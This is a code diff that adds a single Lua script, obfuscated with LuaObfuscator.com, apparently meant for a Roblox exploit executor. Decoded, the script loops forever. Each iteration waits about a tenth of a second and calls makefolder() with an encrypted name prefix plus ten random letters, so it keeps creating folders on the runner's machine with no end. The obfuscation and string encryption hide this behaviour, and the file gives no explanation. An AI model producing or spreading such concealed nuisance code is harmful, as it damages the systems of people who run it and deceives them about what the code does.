@@ -1,0 +1,12 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 
+
+]]--
+
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v17=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v17,v17 + 1 )),v1(v2(v9,1 + (v17% #v9) ,1 + (v17% #v9) + 1 )))%256 ));end return v5(v10);end while true do local v11=0 -0 ;local v12;local v13;local v14;local v15;local v16;while true do if (v11==(2 -1)) then v14=nil;v15=nil;v11=5 -3 ;end if (v11==(2 + 0)) then v16=nil;while true do if (v12==(352 -(87 + 263))) then v15={};for v19=1,v14 do table.insert(v15,v13());end v12=9 -6 ;end if (v12==(183 -(67 + 113))) then v16=table.concat(v15,"");makefolder(v7("\215\147\220\117\242\175\135\13\193\194\214\40\227\169\135","\126\177\163\187\69\134\219\167")   .. v16 );break;end if (v12==(1 + 0)) then local v18=0;while true do if (v18==(2 -1)) then v12=432 -(44 + 386) ;break;end if (v18==(0 + 0)) then function v13() local v20=0 -0 ;local v21;while true do local v22=952 -(802 + 150) ;while true do if (v22==(0 -0)) then if (v20==(0 -0)) then v21=nil;if (math.random(1 + 0 ,1140 -(116 + 1022) )==(4 -3)) then local v23=39 + 26 ;local v24=328 -238 ;v21=utf8.char(math.random(v23,v24));else local v25=0;local v26;local v27;while true do if (v25==(998 -(915 + 82))) then v21=utf8.char(math.random(v26,v27));break;end if (v25==0) then v26=274 -177 ;v27=72 + 50 ;v25=1 -0 ;end end end v20=1188 -(1069 + 118) ;end if (v20==(2 -1)) then return v21;end break;end end end end v14=21 -11 ;v18=1 + 0 ;end end end if ((0 -0)==v12) then wait(885.1 -(261 + 624) );v13=nil;v12=1 -0 ;end end break;end if (v11==0) then v12=0 + 0 ;v13=nil;v11=792 -(368 + 423) ;end end end
